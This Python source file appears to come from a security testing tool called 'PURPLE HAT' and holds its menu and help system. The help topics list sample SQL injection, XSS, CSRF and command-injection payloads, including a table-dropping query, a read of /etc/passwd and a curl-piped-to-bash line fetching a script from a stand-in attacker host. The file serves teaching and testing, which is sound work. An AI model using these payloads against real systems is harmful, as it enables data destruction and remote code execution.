from typing import Dict, List, Callable
from ui.renderer import UIRenderer, Symbol, Color


class MenuSystem:
    def __init__(self, renderer: UIRenderer):
        self.renderer = renderer
        self.menu_stack = []
        self.current_menu = None
    
    def create_menu(self, title: str) -> 'Menu':
        return Menu(title, self.renderer)
    
    def show_menu(self, menu: 'Menu'):
        while True:
            self.renderer.print_header(menu.title)
            
            for idx, option in enumerate(menu.options, 1):
                self.renderer.print_option(idx, option['text'], option.get('description', ''))
            
            if menu.show_back:
                self.renderer.print_option(0, "Back", "Return to previous menu")
            self.renderer.print_option(99, "Exit", "Exit application")
            
            choice = self.renderer.input_choice("Select an option")
            
            try:
                choice_num = int(choice)
                
                if choice_num == 99:
                    return False
                
                if choice_num == 0 and menu.show_back:
                    return True
                
                if 1 <= choice_num <= len(menu.options):
                    option = menu.options[choice_num - 1]
                    if callable(option['action']):
                        option['action']()
                    else:
                        self.show_menu(option['action'])
                else:
                    self.renderer.print_error("Invalid selection. Please try again.")
            except ValueError:
                self.renderer.print_error("Please enter a valid number.")
            
            self.renderer.print_divider()


class Menu:
    def __init__(self, title: str, renderer: UIRenderer, show_back: bool = True):
        self.title = title
        self.renderer = renderer
        self.show_back = show_back
        self.options: List[Dict] = []
    
    def add_option(self, text: str, action: Callable, description: str = ""):
        self.options.append({
            'text': text,
            'action': action,
            'description': description
        })
    
    def add_submenu(self, text: str, submenu: 'Menu', description: str = ""):
        self.options.append({
            'text': text,
            'action': submenu,
            'description': description
        })


class HelpSystem:
    def __init__(self, renderer: UIRenderer):
        self.renderer = renderer
        self.help_topics = {
            "SQL Injection": {
                "description": "SQL Injection is a technique to attack databases by inserting malicious SQL code into input fields",
                "examples": [
                    "' OR '1'='1",
                    "' UNION SELECT * FROM users--",
                    "'; DROP TABLE users;--"
                ],
                "techniques": ["Union-based", "Time-based", "Boolean-based", "Error-based", "Stacked"]
            },
            "XSS (Cross-Site Scripting)": {
                "description": "XSS attacks inject malicious JavaScript code into web pages executed in users' browsers",
                "examples": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                "techniques": ["Reflected XSS", "Stored XSS", "DOM-based XSS"]
            },
            "CSRF (Cross-Site Request Forgery)": {
                "description": "CSRF attacks trick users into performing unintended actions without their knowledge",
                "examples": [
                    "<img src='http://vulnerable.com/transfer?amount=1000'>",
                    "Automatic form submission",
                    "Hidden iframe redirect"
                ],
                "techniques": ["GET-based", "POST-based", "Ajax-based"]
            },
            "Command Injection": {
                "description": "Command Injection exploits vulnerable functions that execute system commands with user input",
                "examples": [
                    "; cat /etc/passwd",
                    "| whoami",
                    "$(curl attacker.com/shell.sh | bash)"
                ],
                "techniques": ["Blind injection", "Out-of-band", "Time-based"]
            },
            "Port Scanning": {
                "description": "Port scanning discovers open ports and services running on target servers",
                "examples": [
                    "TCP Connect Scan",
                    "SYN Stealth Scan",
                    "UDP Scan"
                ],
                "techniques": ["Full Connect", "Stealth", "Service Detection", "Banner Grabbing"]
            },
            "Encoding/Decoding": {
                "description": "Encoding techniques help bypass filters and obfuscate payloads",
                "examples": [
                    "Base64 encoding",
                    "URL encoding",
                    "Hex encoding",
                    "HTML entity encoding"
                ],
                "techniques": ["Base64", "URL", "Hex", "HTML", "Unicode", "ROT13"]
            },
        }
    
    def show_main_help(self):
        self.renderer.print_section("PURPLE HAT - Help System")
        self.renderer.print_info("PURPLE HAT is a comprehensive security testing framework.")
        self.renderer.print_info("")
        print(f"{Color.CYAN}{Color.BOLD}Key Features:{Color.RESET}")
        print(f"  {Symbol.SHIELD} SQL Injection Testing")
        print(f"  {Symbol.SHIELD} XSS/CSRF Vulnerability Checking")
        print(f"  {Symbol.SHIELD} Command Injection Testing")
        print(f"  {Symbol.SHIELD} Port Scanning and Service Detection")
        print(f"  {Symbol.SHIELD} Encoding/Decoding Tools")
        print(f"  {Symbol.SHIELD} Network Reconnaissance")
        print(f"  {Symbol.SHIELD} SSL/TLS Analysis")
        print(f"  {Symbol.SHIELD} Authentication Testing")
        self.renderer.print_info("")
        self.show_topic_list()
    
    def show_topic_list(self):
        self.renderer.print_section("Available Help Topics")
        for idx, topic in enumerate(self.help_topics.keys(), 1):
            self.renderer.print_option(idx, topic)
        
        choice = self.renderer.input_choice("Select a topic")
        try:
            choice_num = int(choice)
            if 1 <= choice_num <= len(self.help_topics):
                topic = list(self.help_topics.keys())[choice_num - 1]
                self.show_topic_detail(topic)
        except ValueError:
            self.renderer.print_error("Invalid input")
    
    def show_topic_detail(self, topic: str):
        if topic not in self.help_topics:
            return
        
        info = self.help_topics[topic]
        self.renderer.print_result_box(
            f"Help: {topic}",
            f"{info['description']}\n\n"
            f"{Color.GREEN}Techniques:{Color.RESET}\n"
            f"  {', '.join(info['techniques'])}\n\n"
            f"{Color.GREEN}Examples:{Color.RESET}\n"
            + "\n".join(f"  {Symbol.ARROW} {ex}" for ex in info['examples'])
        )
